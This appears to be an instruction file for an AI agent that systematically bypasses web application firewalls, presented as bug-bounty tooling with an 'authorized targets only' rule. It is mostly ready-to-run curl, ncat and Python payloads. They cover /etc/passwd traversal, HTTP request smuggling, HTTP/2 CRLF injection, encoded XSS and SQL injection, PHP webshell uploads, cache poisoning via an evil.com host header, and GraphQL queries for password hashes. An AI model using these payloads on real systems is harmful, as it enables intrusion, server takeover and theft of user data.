# WAF Bypass Scanner Agent

Systematic WAF bypass testing agent. Identifies which WAF protects the target, then runs a full bypass matrix to find techniques that evade filtering rules.

## Prerequisites

```bash
# Required
which curl || apt install -y curl
which wafw00f || pip3 install wafw00f
which python3 || apt install -y python3
```

## Phase 1: WAF Identification

```bash
# Fingerprint the WAF
wafw00f "$TARGET" -a

# Manual fingerprint — check response headers and status codes
curl -sk -D- "$TARGET" -o /dev/null | grep -iE "server:|x-cdn|x-cache|cf-ray|x-akamai|x-sucuri|x-powered-by|via:"

# Trigger WAF with obvious payload, observe block behavior
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/?q=<script>alert(1)</script>"
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/?q=../../etc/passwd"
# Cloudflare: 403 with cf-ray header
# Akamai: 403 with Reference# in body
# AWS WAF: 403 with x-amzn-requestid
# ModSecurity: 403 with mod_security in body or Server header
# Custom WAF (e.g., OPPO): 412 status code
```

## Phase 2: HTTP Method Bypass

```bash
# Method switching — some WAFs only filter GET
for METHOD in GET POST PUT PATCH DELETE OPTIONS TRACE; do
  echo "=== $METHOD ==="
  curl -sk -X "$METHOD" -o /dev/null -w "%{http_code}" \
    "$TARGET/$PATH?$PAYLOAD" -H "X-HackerOne-Research: $H1USER"
done

# X-HTTP-Method-Override (works when backend respects it, WAF doesn't)
curl -sk -X POST "$TARGET/$PATH" \
  -H "X-HTTP-Method-Override: PUT" \
  -H "X-Method-Override: PUT" \
  -H "X-HTTP-Method: PUT" \
  -d "$PAYLOAD" -D- -o /dev/null
```

## Phase 3: URL Encoding Bypass

```bash
# Single URL encoding
curl -sk "$TARGET/%2e%2e/%2e%2e/etc/passwd" -o /dev/null -w "%{http_code}"

# Double URL encoding (WAF decodes once, backend decodes again)
curl -sk "$TARGET/%252e%252e/%252e%252e/etc/passwd" -o /dev/null -w "%{http_code}"

# Triple URL encoding
curl -sk "$TARGET/%25252e%25252e/etc/passwd" -o /dev/null -w "%{http_code}"

# Mixed encoding
curl -sk "$TARGET/..%2f..%2fetc/passwd" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/..%252f..%252fetc/passwd" -o /dev/null -w "%{http_code}"
```

## Phase 4: Case and Path Variations

```bash
# Case variation on path
curl -sk "$TARGET/Admin" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/ADMIN" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/aDmIn" -o /dev/null -w "%{http_code}"

# Path traversal with backslash (IIS)
curl -sk "$TARGET/..\\..\\etc\\passwd" -o /dev/null -w "%{http_code}"

# Dot segments
curl -sk "$TARGET/./admin/./panel" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin/." -o /dev/null -w "%{http_code}"

# Trailing characters
curl -sk "$TARGET/admin/" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin//" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%20" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%09" -o /dev/null -w "%{http_code}"
```

## Phase 5: Semicolon and Null Byte Injection

```bash
# Tomcat/Java semicolon bypass — path params ignored by WAF, parsed by backend
curl -sk "$TARGET/;.js/admin/panel" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin;.css" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin;x=1/panel" -o /dev/null -w "%{http_code}"

# Null byte injection (legacy, still works on some stacks)
curl -sk "$TARGET/admin%00.html" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%00" -o /dev/null -w "%{http_code}"

# Fragment injection (WAF may stop parsing at #)
curl -sk "$TARGET/admin#bypass" -o /dev/null -w "%{http_code}"
```

## Phase 6: Unicode Normalization

```bash
# Unicode normalization bypass
# Forward slash alternatives
curl -sk "$TARGET/..%c0%af..%c0%afetc/passwd" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/..%ef%bc%8f..%ef%bc%8fetc/passwd" -o /dev/null -w "%{http_code}"

# Unicode full-width characters
curl -sk "$TARGET/%ef%bc%a1dmin" -o /dev/null -w "%{http_code}"  # fullwidth A
```

## Phase 7: Content-Type and Encoding Confusion

```bash
# Chunked transfer encoding — WAF may not reassemble chunks
printf 'POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nq=<\r\n9\r\nscript>1\r\n0\r\n\r\n' "$PATH" "$HOST" | \
  ncat --ssl "$HOST" 443

# Content-Type confusion
curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$PAYLOAD" -o /dev/null -w "%{http_code}"

curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/json" \
  -d "{\"q\":\"$PAYLOAD\"}" -o /dev/null -w "%{http_code}"

curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: multipart/form-data; boundary=BOUNDARY" \
  --data-binary $'--BOUNDARY\r\nContent-Disposition: form-data; name="q"\r\n\r\n'"$PAYLOAD"$'\r\n--BOUNDARY--' \
  -o /dev/null -w "%{http_code}"

# charset trick
curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  -d "$(echo "$PAYLOAD" | iconv -t ibm037)" -o /dev/null -w "%{http_code}"
```

## Phase 8: IP-Based Header Spoofing

```bash
# Pretend to be localhost — some WAFs whitelist internal IPs
HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
  "CF-Connecting-IP: 127.0.0.1"
  "Fastly-Client-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
)
for HDR in "${HEADERS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$PATH?$PAYLOAD" -H "$HDR")
  echo "$HDR -> $CODE"
done
```

## Phase 9: Protocol Downgrade

```bash
# HTTP/1.0 downgrade — some WAFs only inspect HTTP/1.1
curl -sk --http1.0 "$TARGET/$PATH?$PAYLOAD" -o /dev/null -w "%{http_code}"

# HTTP/2 upgrade — some WAFs don't inspect HTTP/2
curl -sk --http2 "$TARGET/$PATH?$PAYLOAD" -o /dev/null -w "%{http_code}"

# h2c smuggling (cleartext HTTP/2 over HTTP/1.1 upgrade)
curl -sk "$TARGET/$PATH" --http2-prior-knowledge -o /dev/null -w "%{http_code}"
```

## Phase 10: Parameter Pollution

```bash
# HPP — duplicate params, WAF checks first, backend uses last (or vice versa)
curl -sk "$TARGET/$PATH?q=safe&q=$PAYLOAD" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/$PATH?q=$PAYLOAD&q=safe" -o /dev/null -w "%{http_code}"

# Parameter with different separators
curl -sk "$TARGET/$PATH?q=safe;q=$PAYLOAD" -o /dev/null -w "%{http_code}"

# JSON array trick
curl -sk -X POST "$TARGET/$PATH" -H "Content-Type: application/json" \
  -d "{\"q\":[\"safe\",\"$PAYLOAD\"]}" -o /dev/null -w "%{http_code}"
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| Full WAF bypass allowing arbitrary payloads | Critical |
| Path-based WAF bypass to admin panels | High |
| Partial bypass (specific payload patterns only) | Medium |
| Information disclosure of WAF type/version | Low |

## Output Format

For each bypass found, report:
1. **WAF Identified**: Name and version if known
2. **Bypass Technique**: Which category worked
3. **Working Payload**: Exact curl command that bypasses
4. **Blocked Payload**: Equivalent curl command that gets blocked (for comparison)
5. **Impact**: What the bypass enables (XSS, SQLi, path traversal, admin access)
6. **Severity**: Critical/High/Medium/Low

## Rules

- Always include `X-HackerOne-Research` or `X-Bug-Bounty` header
- Test on authorized targets only
- Start with detection, then escalate to bypass testing
- Log every bypass attempt and result
- Never use bypass techniques to exfiltrate real data

## 2026 WAF Bypass Techniques

### HTTP/2 Exclusive Attacks

```bash
# CRLF injection in HTTP/2 pseudo-headers
# HTTP/2 uses binary framing — pseudo-headers (:path, :method, :authority) are sent as HPACK-encoded
# Some WAFs decode HTTP/2 to HTTP/1.1 internally, enabling CRLF injection via the translation layer

# Inject CRLF in :path pseudo-header (requires h2 tooling)
python3 -c "
import h2.connection, h2.config, h2.events, socket, ssl
config = h2.config.H2Configuration(header_encoding='utf-8')
conn = h2.connection.H2Connection(config=config)
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
s = ctx.wrap_socket(socket.create_connection(('TARGET', 443)), server_hostname='TARGET')
conn.initiate_connection()
s.sendall(conn.data_to_send())
# Inject CRLF in path — WAF sees /safe, backend sees injected header
conn.send_headers(1, [
    (':method', 'GET'),
    (':path', '/safe HTTP/1.1\r\nX-Injected: true\r\nIgnore: '),
    (':authority', 'TARGET'),
    (':scheme', 'https'),
])
s.sendall(conn.data_to_send())
print(s.recv(65535))
"

# Binary header injection — inject non-ASCII bytes in HTTP/2 header values
# HTTP/2 allows binary values; if WAF converts to HTTP/1.1, it may break parsing
python3 -c "
import h2.connection, h2.config, socket, ssl
config = h2.config.H2Configuration(header_encoding=False)  # allow raw bytes
conn = h2.connection.H2Connection(config=config)
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
s = ctx.wrap_socket(socket.create_connection(('TARGET', 443)), server_hostname='TARGET')
conn.initiate_connection()
s.sendall(conn.data_to_send())
conn.send_headers(1, [
    (':method', 'GET'),
    (':path', b'/api/search?q=\x00<script>alert(1)</script>'),
    (':authority', 'TARGET'),
    (':scheme', 'https'),
])
s.sendall(conn.data_to_send())
print(s.recv(65535))
"
```

### HTTP/3 QUIC Bypass

```bash
# Many WAFs only inspect HTTP/1.1 and HTTP/2 traffic
# HTTP/3 runs over QUIC (UDP:443) — if the backend supports it and the WAF doesn't inspect it, bypass is trivial

# Check if target supports HTTP/3
curl -sI --http3 "https://TARGET/" 2>&1 | head -20
# Look for: alt-svc: h3=":443" in response headers
curl -sI "https://TARGET/" | grep -i "alt-svc.*h3"

# Send payload over HTTP/3 — WAF may not inspect QUIC traffic
curl -sk --http3 "https://TARGET/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
curl -sk --http3 "https://TARGET/?id=1'+OR+1=1--" -o /dev/null -w "%{http_code}"

# Compare HTTP/1.1 vs HTTP/3 response codes
echo "=== HTTP/1.1 ===" && curl -sk --http1.1 "https://TARGET/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
echo "=== HTTP/3 ===" && curl -sk --http3 "https://TARGET/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
# If HTTP/1.1 returns 403 and HTTP/3 returns 200, WAF doesn't inspect QUIC
```

### Chunked Transfer Encoding Abuse with Chunk Extensions

```bash
# RFC 7230 allows chunk extensions: size;extension=value\r\n
# WAFs that parse chunked bodies may not handle extensions correctly

# Chunk extension injection — WAF parses size, ignores extension, but may miscalculate body
printf 'POST /api/search HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n3;ext=bypass\r\nq=<\r\n6;ext=bypass\r\nscript\r\n9;ext=bypass\r\n>alert(1\r\n2;ext=bypass\r\n)<\r\na;ext=bypass\r\n/script>\r\n0\r\n\r\n' | ncat --ssl TARGET 443

# Chunked with extremely long extension (buffer overflow in WAF parser)
python3 -c "
ext = 'x' * 65535
body = f'3;{ext}\r\nq=<\r\n9;{ext}\r\nscript>1\r\n0\r\n\r\n'
headers = f'POST /search HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\n\r\n'
print(headers + body)
" | ncat --ssl TARGET 443

# Double Transfer-Encoding (WAF uses one, backend uses the other)
printf 'POST /api HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n' | ncat --ssl TARGET 443
```

### Content-Type Confusion

```bash
# Multipart boundary manipulation — WAF and backend may parse boundary differently
# Boundary with quotes vs without
curl -sk -X POST "https://TARGET/api" \
  -H 'Content-Type: multipart/form-data; boundary="=====BOUNDARY======"' \
  --data-binary $'--=====BOUNDARY======\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--=====BOUNDARY======--'

# Charset trick — declare charset that transforms payload
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=utf-7" \
  -d "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"

# IBM037 charset — WAF inspects ASCII, backend decodes EBCDIC
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  --data-binary "$(python3 -c "print('q=<script>alert(1)</script>'.encode('cp037').decode('latin1'))")"

# Multiple Content-Type headers — WAF uses first, backend uses last
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: text/plain" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "q=<script>alert(1)</script>"
```

### Unicode Normalization Exploits

```bash
# Fullwidth characters — Unicode range FF01-FF5E maps to ASCII 21-7E after NFC normalization
# WAF sees fullwidth, backend normalizes to ASCII
# Fullwidth < = \uFF1C, > = \uFF1E, ' = \uFF07, " = \uFF02
curl -sk "https://TARGET/?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E"

# Compatibility decomposition (NFKC/NFKD)
# fi ligature (U+FB01) decomposes to "fi" — bypass keyword filters
# ﬁlter → filter after NFKC
curl -sk "https://TARGET/?q=%EF%AC%81le:///etc/passwd"

# Half-width Katakana trick (some backends normalize these)
# U+FF73 (halfwidth U) + U+FF86 (halfwidth NI) → "UNI" in some normalizations
python3 -c "
import urllib.parse
# Build UNION SELECT using fullwidth
payload = '\uff35\uff2e\uff29\uff2f\uff2e \uff33\uff25\uff2c\uff25\uff23\uff34 1,2,3--'
print(urllib.parse.quote(payload))
" | xargs -I{} curl -sk "https://TARGET/?id=1+{}" -o /dev/null -w "%{http_code}"

# Combining characters — add zero-width joiners or combining marks inside keywords
# S + combining char + E + L + E + C + T — WAF sees 8 chars, backend normalizes to SELECT
curl -sk "https://TARGET/?id=1+S%E2%80%8BELECT+1,2,3--"  # zero-width space in SELECT
```

### Request Line Injection via Absolute-Form URIs

```bash
# HTTP/1.1 allows absolute-form request targets: GET http://host/path HTTP/1.1
# Some WAFs only parse the path from the Request-URI, not the full absolute form

# Absolute-form URI with different host
printf 'GET http://internal-api.target.com/admin HTTP/1.1\r\nHost: TARGET\r\n\r\n' | ncat --ssl TARGET 443

# Absolute-form with path confusion
printf 'GET http://TARGET/safe-path HTTP/1.1\r\nHost: TARGET\r\nX-Original-URL: /admin\r\nX-Rewrite-URL: /admin\r\n\r\n' | ncat --ssl TARGET 443

# asterisk-form for OPTIONS
printf 'OPTIONS * HTTP/1.1\r\nHost: TARGET\r\n\r\n' | ncat --ssl TARGET 443
```

### Multipart Form-Data Boundary Manipulation

```bash
# Boundary with special characters — WAF may fail to parse
curl -sk -X POST "https://TARGET/upload" \
  -H $'Content-Type: multipart/form-data; boundary=----\x00BYPASS' \
  --data-binary $'------\x00BYPASS\r\nContent-Disposition: form-data; name="file"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo(); ?>\r\n------\x00BYPASS--'

# Filename in Content-Disposition with path traversal
curl -sk -X POST "https://TARGET/upload" \
  -H "Content-Type: multipart/form-data; boundary=BOUND" \
  --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="....//....//shell.php"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET["c"]); ?>\r\n--BOUND--'

# Duplicate Content-Disposition headers
curl -sk -X POST "https://TARGET/upload" \
  -H "Content-Type: multipart/form-data; boundary=BOUND" \
  --data-binary $'--BOUND\r\nContent-Disposition: form-data; name="file"; filename="safe.txt"\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: text/plain\r\n\r\n<?php system($_GET["c"]); ?>\r\n--BOUND--'
```

### HTTP Parameter Pollution Across Web Servers

```bash
# Different web servers handle duplicate parameters differently:
# IIS/ASP.NET: concatenates with comma → id=1,UNION SELECT 1,2,3
# Apache/PHP:  uses LAST value       → id=UNION SELECT 1,2,3
# Nginx/PHP:   uses LAST value       → id=UNION SELECT 1,2,3
# Tomcat/Java: uses FIRST value      → id=1
# Express/Node: returns array         → id=["1","UNION SELECT 1,2,3"]

# WAF typically checks FIRST param, exploit server behavior:
# Against Apache/PHP (WAF checks first=safe, PHP uses last=payload)
curl -sk "https://TARGET/?id=1&id=1+UNION+SELECT+1,2,3--" -o /dev/null -w "%{http_code}"

# Against IIS (comma concatenation creates valid SQLi)
curl -sk "https://TARGET/?id=1+UNION+SELECT+1&id=2&id=3--" -o /dev/null -w "%{http_code}"

# Body vs query string pollution (WAF may check query, backend reads body)
curl -sk -X POST "https://TARGET/api?id=safe" \
  -d "id=1+UNION+SELECT+1,2,3--" -o /dev/null -w "%{http_code}"
```

### Cache Deception via Path Confusion

```bash
# Path confusion: trick the cache into storing dynamic content as static
# The WAF/CDN sees a static file extension and caches the response

# Cache deception — get victim's sensitive data cached
curl -sk "https://TARGET/api/user/settings/..%2f..%2fstatic%2fcached.css" -D-
curl -sk "https://TARGET/account/profile/nonexistent.js" -D-
curl -sk "https://TARGET/api/me/.css" -D-

# Cache poisoning — inject payload into cached response
curl -sk "https://TARGET/static/cached.js" -H "X-Forwarded-Host: evil.com"
curl -sk "https://TARGET/static/cached.js" -H "X-Forwarded-Scheme: nothttps"

# Path parameter + extension trick
curl -sk "https://TARGET/api/user/123;x.css" -D- | grep -i "cache"
curl -sk "https://TARGET/api/user/123%0A.css" -D- | grep -i "cache"
```

### Large Body Bypass

```bash
# WAFs often only inspect the first N bytes of request body (commonly 8KB, 16KB, or 128KB)
# Pad the body to push the real payload past the inspection boundary

# Detect inspection limit via binary search
for SIZE in 1024 2048 4096 8192 16384 32768 65536 131072; do
  PADDING=$(python3 -c "print('a=b&' * ($SIZE // 4))")
  CODE=$(curl -sk -X POST "https://TARGET/api" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "${PADDING}q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}")
  echo "Padding ${SIZE} bytes -> HTTP $CODE"
done

# JSON large body bypass
python3 -c "
import json
padding = {'junk_' + str(i): 'x' * 1000 for i in range(200)}
padding['payload'] = \"' OR 1=1--\"
print(json.dumps(padding))
" | curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  --data-binary @- -o /dev/null -w "%{http_code}"
```

### JSON Comment Injection

```bash
# Some JSON parsers accept comments (//line or /*block*/)
# WAFs that parse JSON strictly may not inspect content after comments

# Line comment injection — parser skips to next line
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"id": "1"//,"exploit":"UNION SELECT 1,2,3--"
,"id":"1 UNION SELECT 1,2,3--"}'

# Block comment — hide payload inside comment that lenient parser ignores differently
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"id": "1"/*bypass*/,"q":"<script>alert(1)</script>"}'

# JSONC (JSON with comments) — Node.js and some Java parsers accept this
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{
  // safe looking comment
  "search": "<img src=x onerror=alert(1)>"
}'

# Duplicate JSON keys — WAF reads first, backend reads last
curl -sk -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"id":"safe","id":"1 UNION SELECT 1,2,3--"}'
```

### GraphQL Query Obfuscation

```bash
# Aliases — rename fields to bypass keyword detection
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ safe: __schema { types { name } } }"}'

# Fragment spread — split query across fragments to evade pattern matching
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { ...F1 } fragment F1 on Query { users { ...F2 } } fragment F2 on User { id email password }"}'

# Variables — move payload to variables section (WAFs often only inspect the query string)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query($input: String!) { search(q: $input) { id } }","variables":{"input":"<script>alert(1)</script>"}}'

# Batched queries — WAF may inspect first query, backend processes all
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ __typename }"},{"query":"{ users { id email passwordHash } }"}]'

# Persisted queries / APQ — bypass WAF entirely by using a hash
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"KNOWN_HASH"}}}'

# Whitespace and newline obfuscation
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{\n\t\tusers\n\t\t{\n\t\t\tid\n\t\t\temail\n\t\t\tpassword\n\t\t}\n\t}"}'
```
